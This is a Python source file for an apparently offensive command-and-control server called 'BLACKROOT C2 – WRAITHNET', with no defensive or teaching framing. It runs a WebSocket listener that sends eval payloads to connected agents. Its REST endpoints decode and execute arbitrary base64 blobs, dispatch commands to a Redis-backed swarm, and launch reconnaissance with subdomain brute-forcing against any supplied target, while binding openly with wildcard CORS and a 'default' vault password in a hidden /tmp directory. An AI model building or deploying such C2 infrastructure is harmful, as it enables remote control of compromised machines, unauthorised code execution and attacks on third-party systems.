#!/usr/bin/env python3
"""
BLACKROOT C2 – WRAITHNET node
Unified WebSocket + REST + Redis listener
"""
import asyncio, json, os, sys, base64, threading, uuid, logging
import redis.asyncio as aioredis
import redis
import websockets
from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict, Any

# --- path hack for assimilate ---
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "assimilate", "src")))

from recon.scanner import ReconModule
from black_vault import BlackVault
from swarm_mesh import SwarmMesh
from assimilate.src.neuro_assimilator import NeuroAssimilatorAgent

logging.basicConfig(level=logging.INFO, format="%(asctime)s [C2] %(message)s")
logger = logging.getLogger("C2")

# ---------- CONFIG ----------
C2_PORT   = int(os.getenv("C2_PORT", 8765))
HTTP_PORT = int(os.getenv("HTTP_PORT", 8000))
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")



redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
sync_redis_client = redis.from_url(REDIS_URL, decode_responses=True)
swarm        = SwarmMesh("controller-node")
swarm.redis  = sync_redis_client  # SwarmMesh expects sync Redis
swarm.channel = "blackroot_swarm"

# Synchronous Redis client for ReconModule
sync_redis_client = redis.from_url(REDIS_URL, decode_responses=True)

# Vault auto-picks writable dir
def _vault_dir():
    import tempfile
    try:
        os.makedirs("/tmp/.blackvault", exist_ok=True)
        return "/tmp/.blackvault"
    except Exception:
        return tempfile.mkdtemp(prefix=".vault_")

vault   = BlackVault(password="default", vault_path=_vault_dir())
agent   = NeuroAssimilatorAgent()
agent.vault = vault
rec_mod = ReconModule(vault, swarm, sync_redis_client)

# ---------- WEBSOCKET C2 ----------
async def ws_handler(websocket):
    logger.info("[📡] Agent connected")
    try:
        async for msg in websocket:
            logger.info("[💬] WS: %s", msg)
            await websocket.send(json.dumps({"eval": "console.log('C2 live')"}))
    except websockets.exceptions.ConnectionClosed:
        logger.info("[📡] Agent disconnected")

async def ws_server():
    logger.info("[📡] WRAITHNET C2 listening on ws://0.0.0.0:%s", C2_PORT)
    async with websockets.serve(ws_handler, "0.0.0.0", C2_PORT):
        await asyncio.Future()  # run forever

# ---------- REST API ----------
app = FastAPI(title="BLACKROOT C2")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], allow_methods=["*"], allow_headers=["*"]
)

@app.post("/assimilate")
async def assimilate(req: Request):
    body = await req.json()
    name, typ, blob_b64 = body["name"], body["type"], body["blob"]
    blob = base64.b64decode(blob_b64)
    vault.store(name, blob)
    ok   = agent.discover_and_assimilate({"name": name, "type": typ, "source": blob})
    return {"status": "assimilated" if ok else "rejected"}

@app.post("/execute")
async def execute():
    results = agent.act("execute_code")
    return {"executed": results}

@app.get("/codex")
def codex_status():
    return {h: {"name": m["name"], "type": m["type"]} for h, m in agent.codex.items()}

@app.post("/dispatch")
async def dispatch(req: Request):
    cmd = await req.json()
    swarm.inject_command(cmd, cmd.get("action", "default"))
    return {"status": "queued", "command": cmd}

@app.post("/recon")
async def recon(req: Request):
    body = await req.json()
    target = body["target"]
    max_depth = body.get("max_depth", 3)
    brute_subdomains = body.get("brute_subdomains", True)
    cid = body.get("command_id", uuid.uuid4().hex)
    res = rec_mod.advanced_recon(target, max_depth, None, brute_subdomains, cid)
    return {"status": "completed", "command_id": cid, "result": res}

@app.get("/status")
def status():
    return {"peers": list(getattr(swarm, 'peers', {}).keys()),
            "pending": getattr(swarm, 'pending_commands', [])}

@app.get("/ping")
def ping():
    return {"pong": True}

@app.post("/run")
async def run_now(req: Request):
    body = await req.json()
    name = body.get("name")
    blob_b64 = body.get("blob")
    if not blob_b64:
        return {"executed": False, "error": "Missing 'blob' in request body"}
    try:
        blob = base64.b64decode(blob_b64)
    except Exception as e:
        return {"executed": False, "error": f"Blob decode failed: {e}"}
    if name:
        vault.store(name, blob)
    result = agent.execute_blob(blob)
    return {"executed": True, "output": result}

# ---------- REDIS LISTENER ----------
def redis_listener():
    def _loop():
        import redis
        r = redis.from_url(REDIS_URL, decode_responses=True)
        pubsub = r.pubsub()
        pubsub.subscribe(swarm.channel)
        logger.info("[C2] Redis listener on %s", swarm.channel)
        for msg in pubsub.listen():
            if msg["type"] == "message":
                try:
                    cmd = json.loads(msg["data"])
                    swarm.inject_command(cmd, cmd.get("action", "default"))
                except Exception as e:
                    logger.error("[C2][Redis] %s", e)
    threading.Thread(target=_loop, daemon=True).start()

# ---------- MAIN ----------
async def main():
    redis_listener()
    # run WebSocket + HTTP concurrently
    await asyncio.gather(
        ws_server(),
        asyncio.create_task(asyncio.to_thread(lambda: __import__("uvicorn").run(
            app, host="0.0.0.0", port=HTTP_PORT, log_level="info"
        )))
    )

if __name__ == "__main__":
    asyncio.run(main())